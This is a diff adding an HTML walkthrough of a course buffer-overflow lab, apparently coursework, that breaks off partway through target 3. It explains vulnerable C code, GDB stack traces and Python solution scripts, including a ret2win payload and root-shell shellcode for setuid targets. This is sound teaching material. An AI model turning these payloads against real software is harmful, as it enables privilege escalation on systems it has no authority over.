@@ -1,0 +1,1036 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Targets 0–4 — Stack Exploitation Walkthrough</title>
+<style>
+  :root {
+    --ink:#17202b; --muted:#5b6879; --bg:#f3f6fa; --card:#fff; --line:#d9e1eb;
+    --red:#b42318; --red-bg:#fef3f2; --green:#13713d; --green-bg:#ecfdf3;
+    --blue:#1d5fa7; --blue-bg:#eff6ff; --amber:#8a5a00; --amber-bg:#fffaeb;
+    --purple:#6941c6; --purple-bg:#f4f0ff;
+    --code-bg:#101823; --code-ink:#dce7f4; --code-muted:#8b9db2;
+    --mono:"Cascadia Code",Consolas,"SFMono-Regular","Liberation Mono",monospace;
+  }
+  * { box-sizing:border-box; }
+  html { scroll-behavior:smooth; }
+  body {
+    margin:0; color:var(--ink);
+    background:
+      radial-gradient(circle at 10% 0%, #e2ecff 0, transparent 32rem),
+      radial-gradient(circle at 92% 16%, #e7f8ef 0, transparent 28rem),
+      var(--bg);
+    font-family:"Segoe UI",system-ui,-apple-system,sans-serif; line-height:1.62;
+  }
+  a { color:var(--blue); }
+  code, pre { font-family:var(--mono); }
+  .wrap { width:min(1180px,calc(100% - 32px)); margin:0 auto; }
+
+  header.hero {
+    color:#f8fbff;
+    background:
+      radial-gradient(circle at 82% 12%, rgba(80,151,255,.28) 0, transparent 25rem),
+      radial-gradient(circle at 14% 84%, rgba(72,211,146,.14) 0, transparent 20rem),
+      linear-gradient(135deg,#101823 0%,#182a3e 54%,#14332b 100%);
+    border-bottom:1px solid #0a1017; padding:62px 0 46px;
+  }
+  .eyebrow { color:#7de0a8; text-transform:uppercase; letter-spacing:.17em; font-size:.74rem; font-weight:800; margin-bottom:14px; }
+  h1 { max-width:1000px; margin:0; font-size:clamp(2.1rem,5vw,4rem); line-height:1.04; letter-spacing:-.035em; }
+  .lede { max-width:900px; color:#bdcad9; font-size:1.08rem; margin:22px 0 26px; }
+  .badges { display:flex; flex-wrap:wrap; gap:9px; }
+  .badge { display:inline-flex; gap:7px; align-items:center; padding:7px 11px; border:1px solid rgba(255,255,255,.16); border-radius:999px; background:rgba(255,255,255,.06); color:#e8eff8; font-size:.75rem; font-weight:700; letter-spacing:.03em; }
+  .badge .dot { width:7px; height:7px; border-radius:50%; background:#7de0a8; }
+  .badge.blue .dot { background:#84bdff; }
+  .badge.amber .dot { background:#ffc266; }
+
+  main { padding:38px 0 80px; }
+  section { margin:54px 0; scroll-margin-top:18px; }
+  h2 { font-size:clamp(1.5rem,3vw,2.1rem); line-height:1.16; letter-spacing:-.025em; margin:0 0 8px; }
+  h2 .num { display:inline-grid; place-items:center; vertical-align:4px; width:34px; height:34px; margin-right:8px; border-radius:10px; background:#18283b; color:#fff; font-size:.94rem; letter-spacing:0; }
+  h3 { font-size:1.12rem; margin:26px 0 8px; }
+  p { margin:10px 0; }
+  .section-intro { color:var(--muted); max-width:930px; margin-bottom:20px; }
+
+  .toc { background:var(--card); border:1px solid var(--line); border-radius:16px; padding:18px 22px; margin-bottom:38px; box-shadow:0 8px 24px rgba(22,34,51,.05); }
+  .toc strong { display:block; font-size:.76rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); margin-bottom:9px; }
+  .toc ol { margin:0; padding-left:20px; columns:2; column-gap:36px; }
+  .toc li { margin:5px 0; break-inside:avoid; }
+
+  .card { background:var(--card); border:1px solid var(--line); border-radius:16px; padding:22px; box-shadow:0 8px 24px rgba(22,34,51,.045); }
+  .grid { display:grid; gap:16px; }
+  .grid.two { grid-template-columns:repeat(2,minmax(0,1fr)); }
+  .grid.three { grid-template-columns:repeat(3,minmax(0,1fr)); }
+  .stat { padding:18px 20px; }
+  .stat .label { color:var(--muted); font-size:.71rem; text-transform:uppercase; letter-spacing:.11em; font-weight:800; }
+  .stat .value { font-family:var(--mono); font-size:1.08rem; font-weight:800; margin-top:6px; word-break:break-word; }
+  .stat .hint { color:var(--muted); font-size:.84rem; margin-top:3px; }
+
+  .callout { border-radius:14px; padding:16px 18px; margin:18px 0; border:1px solid; }
+  .callout strong:first-child { display:block; margin-bottom:3px; }
+  .callout.danger { background:var(--red-bg); border-color:#f5c7c2; color:#68130d; }
+  .callout.success { background:var(--green-bg); border-color:#b7ebc9; color:#0b5130; }
+  .callout.info { background:var(--blue-bg); border-color:#c7ddf8; color:#123f72; }
+  .callout.warn { background:var(--amber-bg); border-color:#f2d28a; color:#664000; }
+  .callout.purple { background:var(--purple-bg); border-color:#d9ccff; color:#3f2a83; }
+
+  .file-label { display:inline-block; margin:18px 0 -8px; padding:5px 10px; border-radius:8px 8px 0 0; background:#1b2a3d; color:#bdd0e5; font-family:var(--mono); font-size:.72rem; border:1px solid #2b3d53; border-bottom:0; }
+  .file-label + pre { margin-top:0; border-top-left-radius:0; }
+  pre { margin:16px 0; padding:18px 20px; border-radius:14px; background:var(--code-bg); color:var(--code-ink); font-size:.81rem; line-height:1.55; overflow-x:auto; border:1px solid #263649; box-shadow:inset 0 1px 0 rgba(255,255,255,.04); }
+  pre .c { color:var(--code-muted); }
+  pre .g { color:#7be0a3; }
+  pre .r { color:#ff8d84; }
+  pre .y { color:#ffd166; }
+  pre .b { color:#8ec5ff; }
+  pre .p { color:#c7a7ff; }
+
+  .table-wrap { overflow-x:auto; margin:16px 0; border:1px solid var(--line); border-radius:14px; background:#fff; }
+  table { width:100%; border-collapse:collapse; font-size:.86rem; }
+  th,td { text-align:left; padding:10px 13px; border-bottom:1px solid #e9eef5; vertical-align:top; }
+  th { background:#f7f9fc; color:#455367; font-size:.71rem; text-transform:uppercase; letter-spacing:.08em; }
+  tr:last-child td { border-bottom:0; }
+  td.mono, th.mono { font-family:var(--mono); }
+  .pill { display:inline-block; padding:2px 8px; border-radius:999px; font-size:.72rem; font-weight:800; white-space:nowrap; background:#e8edf5; color:#344257; }
+  .pill.red { background:var(--red-bg); color:var(--red); }
+  .pill.green { background:var(--green-bg); color:var(--green); }
+  .pill.blue { background:var(--blue-bg); color:var(--blue); }
+  .pill.amber { background:var(--amber-bg); color:var(--amber); }
+
+  .target-head { display:flex; justify-content:space-between; align-items:end; gap:18px; flex-wrap:wrap; margin-bottom:8px; }
+  .target-head .tag { color:var(--muted); font-family:var(--mono); font-size:.8rem; }
+  .target-banner { border-radius:14px; padding:14px 18px; margin:18px 0; background:#18283b; color:#dce7f4; border:1px solid #0f1925; }
+  .target-banner strong { color:#7de0a3; }
+  .target-banner code { color:#ffd166; }
+
+  ul,ol { padding-left:24px; }
+  li { margin:5px 0; }
+  .small { font-size:.83rem; color:var(--muted); }
+  footer { border-top:1px solid var(--line); padding:26px 0 0; color:var(--muted); font-size:.84rem; }
+
+  @media (max-width:900px) {
+    .grid.two,.grid.three { grid-template-columns:1fr; }
+    .toc ol { columns:1; }
+  }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap">
+    <div class="eyebrow">targets 0–4 · GDB evidence · line-by-line payloads</div>
+    <h1>From C bugs to working payloads</h1>
+    <p class="lede">
+      This page walks through targets 0, 1, 2, 3, and 4: the vulnerable C code,
+      the relevant assembly, the exact stack addresses, the GDB output that proves them,
+      and a line-by-line explanation of each Python solution file.
+      Targets 5 and 6 are intentionally omitted because they already have separate walkthroughs.
+    </p>
+    <div class="badges">
+      <span class="badge"><span class="dot"></span>Actual GDB logs included</span>
+      <span class="badge blue"><span class="dot"></span>32-bit x86 cdecl</span>
+      <span class="badge amber"><span class="dot"></span>Targets 0–4</span>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <nav class="toc">
+    <strong>Contents</strong>
+    <ol>
+      <li><a href="#overview">Overview and reading guide</a></li>
+      <li><a href="#target0">Target 0 — overwrite the grade</a></li>
+      <li><a href="#target1">Target 1 — return to print_good_grade</a></li>
+      <li><a href="#target2">Target 2 — return to shellcode</a></li>
+      <li><a href="#target3">Target 3 — write-what-where</a></li>
+      <li><a href="#target4">Target 4 — alloca integer overflow</a></li>
+      <li><a href="#cheat">Address cheat sheet</a></li>
+    </ol>
+  </nav>
+
+  <!-- ============================================================ -->
+  <section id="overview">
+    <h2><span class="num">0</span>Overview and reading guide</h2>
+    <p class="section-intro">
+      All five binaries are 32-bit, statically linked, non-PIE, and built without a stack
+      canary. Targets 0 and 1 are ordinary student-owned binaries; targets 2, 3, and 4 are
+      setuid-root. The helper normalizes the stack so the addresses in the GDB logs are
+      stable on this VM (ASLR is disabled globally).
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>Target</th><th>Input method</th><th>Core bug</th><th>Key address(s)</th><th>Result</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>target0</strong></td>
+            <td>stdin to <code>gets(name)</code></td>
+            <td>overflow from <code>name</code> into adjacent <code>grade</code></td>
+            <td><code>name=0xfff6ba51</code>, <code>grade=0xfff6ba5b</code></td>
+            <td>changes grade to <code>A+</code></td>
+          </tr>
+          <tr>
+            <td><strong>target1</strong></td>
+            <td>stdin to <code>gets(input)</code></td>
+            <td>return address overwrite (ret2win)</td>
+            <td><code>print_good_grade=0x0804a123</code>, saved EIP slot <code>0xfff6ba5c</code></td>
+            <td>prints “Your grade is perfect.”</td>
+          </tr>
+          <tr>
+            <td><strong>target2</strong></td>
+            <td><code>argv[1]</code> to <code>strcpy</code></td>
+            <td>stack buffer overflow, executable stack</td>
+            <td><code>buf=0xfff6b9dc</code>, saved EIP slot <code>0xfff6ba4c</code></td>
+            <td>root shell</td>
+          </tr>
+          <tr>
+            <td><strong>target3</strong></td>
+            <td><code>argv[1]</code> to <code>strncpy</code></td>
+            <td>overwrites <code>a</code> and <code>p</code>, then <code>*p = a</code></td>
+            <td><code>buf=0xfff6b238</code>, <code>p=0xfff6ba4c</code></td>
+            <td>root shell</td>
+          </tr>
+          <tr>
+            <td><strong>target4</strong></td>
+            <td>binary file via <code>read_file</code></td>
+            <td>alloca size overflow; huge <code>read_elements</code> count</td>
+            <td><code>buf=0xfff6ba20</code>, return slot <code>0xfff6ba4c</code></td>
+            <td>root shell</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout info">
+      <strong>How to read the GDB excerpts</strong>
+      <code>EBP</code> is the frame base. Addresses below EBP are locals; <code>[EBP]</code>
+      is the saved EBP; <code>[EBP+4]</code> is the saved return address that <code>ret</code>
+      pops into EIP. An address printed as <code>0x804a123</code> is the same as
+      <code>0x0804a123</code>; GDB just omits leading zeroes.
+    </div>
+
+    <div class="callout warn">
+      <strong>Build flags used by the lab</strong>
+      <code>gcc -g -m32 -static -U_FORTIFY_SOURCE -fno-stack-protector</code>.
+      Targets 0–4 add <code>-z execstack</code>, so their stacks are readable, writable,
+      and executable. Targets 2–4 are mode <code>6777</code>, owner root.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="target0">
+    <div class="target-head">
+      <h2><span class="num">1</span>Target 0 — overwrite the grade</h2>
+      <span class="tag">stdin · gets · no return-address overwrite</span>
+    </div>
+    <p class="section-intro">
+      Target 0 is the simplest case: two arrays sit next to each other on the stack, and
+      <code>gets()</code> can write past <code>name</code> into <code>grade</code>. This is
+      not a return-address exploit; it changes the program's data.
+    </p>
+
+    <div class="target-banner">
+      <strong>Objective:</strong> make the program print a good grade.
+      <code>grade</code> is initialized to <code>"nil"</code>; <code>gets(name)</code> has no bound.
+    </div>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">target0.c</h3>
+        <pre style="margin-bottom:0">int _main(int argc, char *argv[])
+{
+    char grade[5];
+    char name[10];
+
+    strcpy(grade, "nil");
+
+    gets(name);                 <span class="c">// no bounds check</span>
+
+    printf("Hi %s! Your grade is %s.\n", name, grade);
+
+    exit(0);
+}</pre>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">Key assembly from _main</h3>
+        <pre style="margin-bottom:0">0804a0a7: lea    eax,[ebp-0xd]       <span class="c">; &amp;grade</span>
+0804a0aa: mov    DWORD PTR [eax],0x6c696e  <span class="c">; "nil\0"</span>
+0804a0b3: lea    eax,[ebp-0x17]      <span class="c">; &amp;name</span>
+0804a0b7: call   gets                <span class="c">; reads unbounded input</span>
+...
+0804a0c2: lea    eax,[ebp-0xd]       <span class="c">; grade argument to printf</span>
+0804a0c6: lea    eax,[ebp-0x17]      <span class="c">; name argument to printf</span></pre>
+        <p class="small" style="margin-bottom:0">
+          The important constants are <code>0xd</code> and <code>0x17</code>:
+          the distance between <code>name</code> and <code>grade</code> is
+          <code>0x17 - 0xd = 0xa = 10</code> bytes.
+        </p>
+      </div>
+    </div>
+
+    <h3>GDB evidence — the arrays and the overwrite</h3>
+    <div class="file-label">gdb_target0.txt</div>
+    <pre><span class="b">[1] target0: before gets(name)</span>
+<span class="g">EBP = 0xfff6ba68   ESP = 0xfff6ba40</span>
+<span class="y">name  = EBP-0x17 = 0xfff6ba51</span>
+<span class="y">grade = EBP-0xd  = 0xfff6ba5b</span>
+saved EIP slot = EBP+4 = 0xfff6ba6c
+grade currently contains: 0xfff6ba5b: "nil"
+<span class="c"># GDB evaluated &name and &grade directly:</span>
+$1 = 0xfff6ba51
+$2 = 0xfff6ba5b
+
+<span class="b">[2] target0: AFTER gets(name)</span>
+name  = 0xfff6ba51 : "1556460"
+grade = 0xfff6ba5b : <span class="g">"A+"</span>
+bytes from name through grade:
+0xfff6ba51: 31 35 35 36 34 36 30 00 00 00 <span class="g">41 2b</span> 00 00 00 00
+<span class="c">#            "1 5 5 6 4 6 0"  NUL NUL NUL  A  +  NUL</span>
+saved EIP slot 0xfff6ba6c still contains 0x0804a05a</pre>
+
+    <div class="callout success">
+      <strong>Why the three NUL bytes are there</strong>
+      The SID is 7 bytes long, but <code>name</code> is 10 bytes. The three NUL bytes fill
+      <code>name[7..9]</code>, so the following bytes land exactly at <code>grade[0]</code>.
+      They also terminate the string, which is why the program prints only the SID and not
+      the grade bytes as part of the name. <code>gets</code> adds the final NUL after
+      <code>"A+"</code>, so the grade string becomes exactly <code>"A+"</code>.
+    </div>
+
+    <h3>sol0.py, line by line</h3>
+    <div class="file-label">sol0.py</div>
+    <pre>import sys
+
+sid = b"1556460"                       <span class="c"># 7-byte student ID</span>
+padding = b"\x00" * (10 - len(sid))    <span class="c"># 3 NULs: fill name[7..9]</span>
+grade = b"A+"                          <span class="c"># overwrite grade[0..1]</span>
+
+payload = sid + padding + grade        <span class="c"># 10 bytes name + grade bytes</span>
+
+sys.stdout.buffer.write(payload)       <span class="c"># becomes stdin for ./target0</span></pre>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Line</th><th>What it does</th><th>Stack effect</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">sid = b"1556460"</td><td>Stores the 7-byte ID.</td><td>Will occupy <code>name[0..6]</code>.</td></tr>
+          <tr><td class="mono">padding = b"\x00" * (10-len(sid))</td><td>Adds 3 NUL bytes.</td><td>Occupies <code>name[7..9]</code>; next write hits <code>grade[0]</code>.</td></tr>
+          <tr><td class="mono">grade = b"A+"</td><td>Two bytes that overwrite <code>grade[0..1]</code>.</td><td>Changes <code>"nil"</code> to <code>"A+"</code>.</td></tr>
+          <tr><td class="mono">payload = ...</td><td>Concatenates the three parts.</td><td>10 bytes name, then 2 bytes grade.</td></tr>
+          <tr><td class="mono">sys.stdout.buffer.write(payload)</td><td>Writes raw bytes, no newline.</td><td>Passed as stdin to <code>gets</code>.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout info">
+      <strong>Run it</strong>
+      <code>python3 sol0.py | ./target0</code> produces:
+      <code>Hi 1556460! Your grade is A+.</code>
+    </div>
+
+    <p class="small">
+      Raw evidence: <a href="gdb_target0.txt">gdb_target0.txt</a> ·
+      disassembly: <a href="target0_disasm.txt">target0_disasm.txt</a> ·
+      source: <a href="target0.c">target0.c</a> · solution: <a href="sol0.py">sol0.py</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="target1">
+    <div class="target-head">
+      <h2><span class="num">2</span>Target 1 — return to print_good_grade</h2>
+      <span class="tag">stdin · gets · ret2win</span>
+    </div>
+    <p class="section-intro">
+      Target 1 turns the overflow into control flow. The function
+      <code>print_good_grade()</code> already exists at a fixed address; the goal is to
+      overwrite the saved return address of <code>vulnerable()</code> with that address.
+    </p>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">target1.c</h3>
+        <pre style="margin-bottom:0">void print_good_grade(void)
+{
+    puts("Your grade is perfect.");
+    exit(1);
+}
+
+void vulnerable()
+{
+    char input[4];
+    gets(input);            <span class="c">// unbounded read into 4-byte buffer</span>
+}
+
+int _main()
+{
+    vulnerable();
+    print_bad_grade();      <span class="c">// normal path</span>
+    return 0;
+}</pre>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">Key assembly</h3>
+        <pre style="margin-bottom:0">0804a151 &lt;vulnerable&gt;:
+ push ebp
+ mov  ebp,esp
+ push ebx
+ sub  esp,0x14
+ ...
+ 804a165: lea edx,[ebp-0xc]   <span class="c">; &amp;input</span>
+ 804a168: push edx
+ 804a16b: call gets
+ ...
+ 804a174: mov ebx,[ebp-0x4]
+ 804a177: leave               <span class="c">; ESP = EBP, pop saved EBP</span>
+ 804a178: ret                 <span class="c">; pop saved EIP</span>
+
+<span class="g">0804a123 &lt;print_good_grade&gt;:
+ push ebp
+ ...
+ call puts                <span class="c">; "Your grade is perfect."</span>
+ push 1
+ call exit</span></pre>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <strong>The offset calculation</strong>
+      <code>input</code> starts at <code>EBP-0xc</code>. The saved EBP is at
+      <code>EBP+0</code>, and the saved EIP is at <code>EBP+4</code>. Therefore the
+      distance from <code>input[0]</code> to the saved EIP is
+      <code>0xc + 4 = 16</code> bytes.
+    </div>
+
+    <h3>GDB evidence — normal return vs. hijacked return</h3>
+    <div class="file-label">gdb_target1.txt</div>
+    <pre><span class="b">[1] target1: before gets(input)</span>
+<span class="g">EBP = 0xfff6ba58   ESP = 0xfff6ba30</span>
+<span class="y">input = EBP-0xc = 0xfff6ba4c</span>
+saved EIP slot = EBP+4 = 0xfff6ba5c
+<span class="r">original saved EIP = 0x0804a18e</span>  <span class="c"># return to _main, then print_bad_grade</span>
+$1 = 0xfff6ba4c
+
+<span class="b">[2] target1: AFTER gets(input)</span>
+input = 0xfff6ba4c
+<span class="g">saved EIP value NOW = 0x0804a123</span>  <span class="c"># print_good_grade</span>
+bytes around input and saved EIP:
+0xfff6ba4c: 41 41 41 41 41 41 41 41   <span class="c"># 16 A's</span>
+0xfff6ba54: 41 41 41 41 41 41 41 41
+0xfff6ba5c: <span class="g">23 a1 04 08</span>              <span class="c"># 0x0804a123 little-endian</span>
+
+<span class="b">[3] target1: at vulnerable() ret</span>
+ESP = 0xfff6ba5c
+<span class="g">ret will pop = 0x0804a123</span>
+0xfff6ba5c: 0x0804a123 0x00000000 0x00000000 0xffffdc08
+target instruction:
+   0x804a123 &lt;print_good_grade&gt;: push ebp
+
+<span class="b">[4] target1: print_good_grade() was reached</span>
+Your grade is perfect.</pre>
+
+    <h3>sol1.py, line by line</h3>
+    <div class="file-label">sol1.py</div>
+    <pre>import sys
+
+padding = b"A" * 16                    <span class="c"># fill input[4] + 12 bytes of frame</span>
+
+target = (0x0804a123).to_bytes(4, "little")  <span class="c"># print_good_grade</span>
+
+payload = padding + target             <span class="c"># 16 bytes + new saved EIP</span>
+
+sys.stdout.buffer.write(payload)       <span class="c"># stdin for ./target1</span></pre>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Line</th><th>Why it is correct</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">padding = b"A" * 16</td><td>Fills the 12 bytes from <code>input</code> to saved EBP, plus 4 bytes of saved EBP, stopping exactly before saved EIP.</td></tr>
+          <tr><td class="mono">0x0804a123</td><td>The first instruction of <code>print_good_grade</code>, confirmed by <code>nm target1</code> and the GDB trace.</td></tr>
+          <tr><td class="mono">to_bytes(4, "little")</td><td>x86 is little-endian: <code>0x0804a123</code> becomes bytes <code>23 a1 04 08</code>.</td></tr>
+          <tr><td class="mono">padding + target</td><td>At offset 16, the saved return address is replaced with the win function.</td></tr>
+          <tr><td class="mono">sys.stdout.buffer.write</td><td><code>gets</code> reads these bytes from stdin.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout success">
+      <strong>Why it works</strong>
+      When <code>vulnerable()</code> executes <code>leave; ret</code>, <code>leave</code>
+      restores the stack pointer to the saved EIP slot, and <code>ret</code> pops
+      <code>0x0804a123</code> into EIP. Execution jumps directly to
+      <code>print_good_grade</code>, bypassing <code>print_bad_grade</code>.
+    </div>
+
+    <p class="small">
+      Raw evidence: <a href="gdb_target1.txt">gdb_target1.txt</a> ·
+      disassembly: <a href="target1_disasm.txt">target1_disasm.txt</a> ·
+      source: <a href="target1.c">target1.c</a> · solution: <a href="sol1.py">sol1.py</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="target2">
+    <div class="target-head">
+      <h2><span class="num">3</span>Target 2 — return to shellcode</h2>
+      <span class="tag">argv · strcpy · executable stack · setuid root</span>
+    </div>
+    <p class="section-intro">
+      Target 2 is the classic shellcode target. The stack is executable, the binary is
+      statically linked and non-PIE, and the helper normalizes the stack, so the buffer
+      address is stable. The payload puts shellcode at the start of the buffer and returns
+      to it.
+    </p>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">target2.c</h3>
+        <pre style="margin-bottom:0">void vulnerable(char *arg)
+{
+    char buf[100];
+    strcpy(buf, arg);       <span class="c">// no bounds check</span>
+}
+
+int _main(int argc, char **argv)
+{
+    if (argc != 2) { ... }
+    vulnerable(argv[1]);    <span class="c">// attacker-controlled argv[1]</span>
+    return 0;
+}</pre>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">Key assembly</h3>
+        <pre style="margin-bottom:0">0804a035 &lt;vulnerable&gt;:
+ push ebp
+ mov  ebp,esp
+ push ebx
+ sub  esp,0x74
+ ...
+ <span class="y">804a04c: lea edx,[ebp-0x6c]</span>  <span class="c">; &amp;buf</span>
+ 804a04f: push edx
+ 804a050: mov  ebx,eax
+ 804a052: call strcpy
+ ...
+ 804a05b: mov ebx,[ebp-0x4]
+ 804a05e: leave
+ 804a05f: ret</pre>
+      </div>
+    </div>
+
+    <div class="callout info">
+      <strong>Offset to saved EIP</strong>
+      <code>buf</code> starts at <code>EBP-0x6c</code>; saved EIP is at
+      <code>EBP+4</code>. The distance is <code>0x6c + 4 = 0x70 = 112</code> bytes.
+      The binary was built with <code>-z execstack</code>; <code>readelf</code> shows
+      <code>GNU_STACK ... RWE</code>, so returning to bytes in the buffer is allowed.
+    </div>
+
+    <h3>GDB evidence — buf, saved EIP, and the shellcode bytes</h3>
+    <div class="file-label">gdb_target2.txt</div>
+    <pre><span class="b">[1] target2: vulnerable() before strcpy</span>
+<span class="g">EBP = 0xfff6ba48   ESP = 0xfff6b9c4</span>
+<span class="y">BUF = EBP-0x6c = 0xfff6b9dc</span>
+saved EIP slot = EBP+4 = 0xfff6ba4c
+<span class="r">original saved EIP = 0x0804a0ad</span>
+$1 = 0xfff6b9dc
+
+<span class="b">[2] target2: AFTER strcpy overflow</span>
+BUF = 0xfff6b9dc
+saved EIP slot = 0xfff6ba4c
+<span class="g">saved EIP value NOW = 0xfff6b9dc</span>  <span class="c"># &amp;buf / shellcode start</span>
+first 32 bytes at BUF:
+0xfff6b9dc: <span class="g">31 db 8d 43 17 99 cd 80</span>  <span class="c"># setuid(0)</span>
+0xfff6b9e4: eb 1f 5e 89 76 08 31 c0
+0xfff6b9ec: 88 46 07 89 46 0c b0 0b
+0xfff6b9f4: 89 f3 8d 4e 08 8d 56 0c
+...
+0xfff6ba4c: <span class="g">0xfff6b9dc</span> 0xfffeb900 0x00000000 0x00000000
+
+<span class="b">[3] target2: vulnerable() ret</span>
+ESP = 0xfff6ba4c
+<span class="g">ret will pop = 0xfff6b9dc</span>
+first bytes at target address:
+0xfff6b9dc: 31 db 8d 43 17 99 cd 80
+first instruction at target:
+   0xfff6b9dc: xor ebx,ebx
+process ... is executing new program: /usr/bin/dash</pre>
+
+    <div class="callout success">
+      <strong>What the shellcode does</strong>
+      <code>shellcode.py</code> is 53 bytes. The first 8 bytes call
+      <code>setuid(0)</code>. The rest use the classic <code>call/pop</code> trick to find
+      the <code>"/bin/sh"</code> string, set up <code>execve</code>, and replace the
+      process with <code>/bin/sh</code>. Because target2 is setuid-root,
+      <code>setuid(0)</code> makes the shell root.
+    </div>
+
+    <h3>sol2.py, line by line</h3>
+    <div class="file-label">sol2.py</div>
+    <pre>from shellcode import shellcode
+import sys
+
+payload = shellcode
+
+padding_length = 112 - len(shellcode)  <span class="c"># reach saved EIP at offset 112</span>
+payload += b"A" * padding_length
+
+target = (0xfff6b9dc).to_bytes(4, "little")  <span class="c"># BUF address</span>
+payload += target
+
+sys.stdout.buffer.write(payload)</pre>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Line</th><th>Meaning / stack effect</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">payload = shellcode</td><td>Shellcode begins at offset 0, so it sits at <code>BUF</code>.</td></tr>
+          <tr><td class="mono">padding_length = 112 - len(shellcode)</td><td>Extends the payload until the saved EIP slot. <code>shellcode</code> is 53 bytes, so padding is 59 bytes.</td></tr>
+          <tr><td class="mono">0xfff6b9dc</td><td>The exact buffer address printed by GDB. The value replaces the saved return address.</td></tr>
+          <tr><td class="mono">to_bytes(4, "little")</td><td>Produces <code>dc b9 f6 ff</code>.</td></tr>
+          <tr><td class="mono">write(payload)</td><td>Passed as <code>argv[1]</code>, copied into <code>buf</code> by <code>strcpy</code>.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout info">
+      <strong>Run it</strong>
+      <code>./target2 "$(python3 sol2.py)"</code>. When the shell starts, type
+      <code>id</code> to verify <code>uid=0(root)</code>.
+    </div>
+
+    <p class="small">
+      Raw evidence: <a href="gdb_target2.txt">gdb_target2.txt</a> ·
+      disassembly: <a href="target2_disasm.txt">target2_disasm.txt</a> ·
+      source: <a href="target2.c">target2.c</a> · solution: <a href="sol2.py">sol2.py</a> ·
+      shellcode: <a href="shellcode.py">shellcode.py</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="target3">
+    <div class="target-head">
+      <h2><span class="num">4</span>Target 3 — write-what-where</h2>
+      <span class="tag">argv · strncpy · *p = a · setuid root</span>
+    </div>
+    <p class="section-intro">
+      Target 3 does not overflow all the way to the saved return address. Instead,
+      <code>strncpy</code> copies exactly 8 bytes past a 2048-byte buffer, overwriting two
+      local variables: <code>a</code> and <code>p</code>. The next line,
+      <code>*p = a</code>, then performs an attacker-controlled 4-byte write.
+    </p>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">target3.c</h3>
+        <pre style="margin-bottom:0">void vulnerable(char *arg)
+{
+    int *p;
+    int a;
+    char buf[2048];
+
+    strncpy(buf, arg, sizeof(buf) + 8);  <span class="c">// 2056 bytes!</span>
+
+    *p = a;                              <span class="c">// write a to *p</span>
+}</pre>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">Key assembly</h3>
+        <pre style="margin-bottom:0">0804a035 &lt;vulnerable&gt;:
+ push ebp
+ mov  ebp,esp
+ push ebx
+ sub  esp,0x814              <span class="c">; 2048-byte buffer + locals</span>
+ ...
+ 804a04c: push 0x808         <span class="c">; sizeof(buf)+8 = 2056</span>
+ 804a051: push [ebp+8]       <span class="c">; arg</span>
+ <span class="y">804a054: lea edx,[ebp-0x810]</span>  <span class="c">; &amp;buf</span>
+ 804a05a: push edx
+ 804a05d: call strncpy
+ ...
+ <span class="g">804a065: mov eax,[ebp-0xc]  ; p</span>
+ <span class="g">804a068: mov edx,[ebp-0x10] ; a</span>
+ <span class="g">804a06b: mov [eax],edx      ; *p = a</span>
+ ...
+ 804a071: leave
+ 804a072: ret</pre>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <strong>The 8 extra bytes</strong>
+      <code>buf</code> occupies <code>EBP-0x810</code> through <code>EBP-0x11</code>.
+      The two locals are directly above it: <code>a</code> at <code>EBP-0x10</code> and
+      <code>p</code> at <code>EBP-0xc</code>. Copying 2056 bytes instead of 2048 writes
+      exactly those 8 bytes. The saved return address at <code>EBP+4</code> is untouched
+      for now.
+    </div>
+
+    <h3>GDB evidence — overwrite a and p, then write through p</h3>
+    <div class="file-label">gdb_target3.txt</div>
+    <pre><span class="b">[1] target3: vulnerable() before strncpy</span>
+<span class="g">EBP = 0xfff6ba48   ESP = 0xfff6b220</span>
+<span class="y">BUF = EBP-0x810 = 0xfff6b238</span>
+<span class="y">a   = EBP-0x10  = 0xfff6ba38</span>
+<span class="y">p   = EBP-0xc   = 0xfff6ba3c</span>
+saved EIP slot = EBP+4 = 0xfff6ba4c
+<span class="r">original saved EIP = 0x0804a0c0</span>
+$1 = 0xfff6b238
+$2 = 0xfff6ba38
+$3 = 0xfff6ba3c
+
+<span class="b">[2] target3: AFTER strncpy (2056 bytes)</span>
+BUF = 0xfff6b238
+<span class="g">a = [EBP-0x10] = 0xfff6b238</span>   <span class="c"># shellcode address</span>
+<span class="g">p = [EBP-0xc]  = 0xfff6ba4c</span>   <span class="c"># saved EIP slot</span>
+saved EIP is still 0x0804a0c0
+first 32 bytes at BUF (shellcode):
+0xfff6b238: 31 db 8d 43 17 99 cd 80
+...
+the 8 bytes after buf: a then p
+0xfff6ba38: <span class="g">0xfff6b238</span> <span class="g">0xfff6ba4c</span> 0x00000000 0x080e8000
+
+<span class="b">[3] target3: just before '*p = a'</span>
